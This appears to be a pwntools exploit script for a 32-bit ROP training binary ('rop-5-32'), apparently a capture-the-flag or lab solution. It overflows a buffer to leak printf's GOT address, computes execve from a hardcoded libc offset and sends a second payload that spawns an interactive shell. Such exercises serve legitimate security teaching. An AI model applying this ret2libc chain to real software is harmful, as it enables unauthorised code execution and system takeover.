#!/usr/bin/env  python

from pwn import *

p = process('./rop-5-32')

printf_got = p.elf.got['printf']
printf_plt = p.elf.plt['printf']
input_func = p.elf.symbols['input_func']

buf = "A" * 0x8c

buf += p32(printf_plt)
buf += p32(input_func)
buf += p32(printf_got)

print(p.recv())

with open("exploit.txt", "wb") as f:
    f.write(buf)

p.sendline(buf)

data = p.recv()
print(repr(data))

cut_data = data[9 + len(buf):]
print_addr = u32(cut_data[:4])

print("Address of print: %s" % hex(print_addr))

offset = 0xf7de47e0 - 0xf7d7d670

execve = print_addr + offset

buf = "A" * 0x8c
buf += p32(execve)
buf += p32(0)

buf += p32(0x8048028)
buf += p32(0)
buf += p32(0)

p.sendline(buf)
p.interactive()
